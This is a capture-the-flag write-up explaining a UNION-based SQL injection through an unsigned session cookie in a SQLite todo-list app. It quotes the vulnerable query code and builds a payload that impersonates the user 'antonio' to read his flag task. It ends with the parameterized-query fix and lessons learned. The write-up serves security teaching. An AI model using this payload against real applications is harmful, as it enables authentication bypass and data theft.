## ToDo - Cookie Bypass

### Challenge Overview

|Field|Detail|
|---|---|
|**Name**|Todo List|
|**URL**|`http://todo.challs.olicyber.it/todo`|
|**Category**|Web / SQL Injection|
|**Vulnerability**|SQLi via session cookie (UNION-based)|
|**Database**|SQLite|


### Reconnaissance

The challenge presents a simple todo list web app, where registering an account and logging in causes the server to set a session cookie of this form:

```
Cookie: session=88d32371-f875-40ab-ac59-3cf509906671
```

The first thing worth noticing is that the session is a plain UUID passed directly in the cookie, with no JWT and no signing of any kind, which makes it immediately worth probing for injection.

---
### Source Code Analysis

We were given `app.py` and `db.py`, and reading them carefully reveals two critical things.

The first is that the flag is seeded directly into the database at startup:

```python
FLAG = os.getenv('FLAG', 'flag{placeholder}')

cursor.execute(
    "INSERT INTO users (id, username, password_hash) VALUES ('%s', 'antonio', '')"
    % antonio_id)

cursor.execute(
    "INSERT INTO tasks (id, description, ...) VALUES ('%s', 'Submit the flag: %s', ...)"
    % (flag_task_id, FLAG, antonio_id))
```

The flag lives in the `tasks` table as the `description` of a task belonging to the user `antonio`, which means we need to find a way to read antonio's tasks.

The second critical finding is that the session lookup function is vulnerable to injection:

```python
def get_user_from_session(self, session_id):
    cursor.execute(
        """SELECT users.id, users.username
        FROM users
        JOIN sessions ON users.id = sessions.user_id
        WHERE sessions.id = '%s';""" % (session_id,))  # ← raw string format!

    users = cursor.fetchall()

    if len(users) == 1:
        return users[0]

    return None
```

The `session_id` value comes directly from the cookie with zero sanitization, formatted straight into the SQL string in classic injection fashion. The only constraint we need to respect is that the query must return exactly 1 row, since the check `len(users) == 1` will otherwise redirect us back to the login page.


### Identifying the Attack Surface

The `/todo` route follows a very linear flow: it reads the session cookie, passes it to `get_user_from_session()`, and if a user is found it calls `get_tasks(user['id'])` and renders the resulting tasks in HTML. Since the injection point sits at the very beginning of this chain, controlling what `get_user_from_session` returns means controlling whose tasks will ultimately be fetched and displayed.


### Building the Exploit

#### Step 1 — How many columns?

The vulnerable query selects exactly 2 columns, `users.id` and `users.username`, so any UNION injection must match this count precisely. Earlier attempts using 3 or more columns all returned HTTP 500 because of the column count mismatch.

#### Step 2 — What database?

The source code confirms the backend is SQLite, which is an important distinction because SQLite uses `sqlite_master` instead of `information_schema`, and its comment syntax is `--`.

#### Step 3 — Craft the payload

What we need to achieve is to inject a UNION that returns antonio's real UUID as the `id` column, producing exactly 1 row to satisfy the `len(users) == 1` check, so that `user['id']` ends up being antonio's real UUID and `get_tasks()` finds his flag task. The payload that achieves all of this is the following:

```sql
' UNION SELECT id,'antonio' FROM users WHERE username='antonio'--
```

Once injected into the vulnerable query, the full SQL that gets executed becomes:

```sql
-- Original query becomes:
SELECT users.id, users.username
FROM users
JOIN sessions ON users.id = sessions.user_id
WHERE sessions.id = ''                              -- ← our ' closes this, matches nothing

UNION

SELECT id,'antonio'                                 -- ← our injected query
FROM users
WHERE username='antonio'                            -- ← returns antonio's real UUID

--';                                                -- ← comments out the rest
```

The result is exactly 1 row containing antonio's real UUID and the string `'antonio'`, which the app accepts without question as a valid session, returning the object `{ id: <antonio's UUID>, username: 'antonio' }`.

#### Step 4 — The app fetches the flag

With `user['id']` now set to antonio's real UUID, the app proceeds normally to call:

```python
tasks = db.get_tasks(user['id'])
# Runs: SELECT * FROM tasks WHERE user_id = '<antonio UUID>'
# Returns: "Submit the flag: flag{...}"
```

The flag is returned as a task and rendered directly in the HTML task list.


### Exploitation

To carry out the attack it is sufficient to open DevTools, navigate to Application → Cookies, and set the session cookie to the following value:

```sql
' UNION SELECT id,'antonio' FROM users WHERE username='antonio'--
```

Reloading `/todo` at that point will show the flag as a task item in the list.


### Root Cause

The vulnerability originates from the use of unsanitized string formatting to build SQL queries, rather than parameterized queries:

```python
# Vulnerable
cursor.execute("... WHERE sessions.id = '%s'" % session_id)

# Safe fix
cursor.execute("... WHERE sessions.id = ?", (session_id,))
```

With parameterized queries the database driver always treats the value as pure data and never as SQL, making injection impossible regardless of what the input contains.


### Full Attack Chain Diagram

```
Attacker sets malicious cookie
            │
            ▼
    GET /todo HTTP/1.1
    Cookie: session=' UNION SELECT id,'antonio'
                      FROM users WHERE username='antonio'--
            │
            ▼
┌─────────────────────────────────────┐
│  get_user_from_session(session_id)  │
│                                     │
│  SQL becomes:                       │
│  SELECT users.id, users.username    │
│  FROM users JOIN sessions ...       │
│  WHERE sessions.id = ''             │  ← matches nothing
│  UNION SELECT id,'antonio'          │
│  FROM users WHERE username='antonio'│  ← returns 1 row
│  --                                 │
│                                     │
│  len(users) == 1 ✅                 │
│  returns antonio's real UUID        │
└─────────────────────────────────────┘
            │
            ▼
┌─────────────────────────────────────┐
│  get_tasks(antonio_uuid)            │
│                                     │
│  SELECT * FROM tasks                │
│  WHERE user_id = '<antonio UUID>'   │
│                                     │
│  Returns: "Submit the flag: 🚩"     │
└─────────────────────────────────────┘
            │
            ▼
    Flag rendered in todo list HTML
```


### Key Takeaways

|Lesson|Detail|
|---|---|
|**Never format user input into SQL**|Use `?` placeholders always|
|**Session tokens are user input**|Cookies are fully attacker-controlled|
|**UNION needs matching column count**|Always check the original SELECT first|
|**SQLite ≠ MySQL**|No `information_schema`, different comment styles|
|**One injected row can bypass auth**|The `len == 1` check became the exploit constraint to satisfy, not a protection|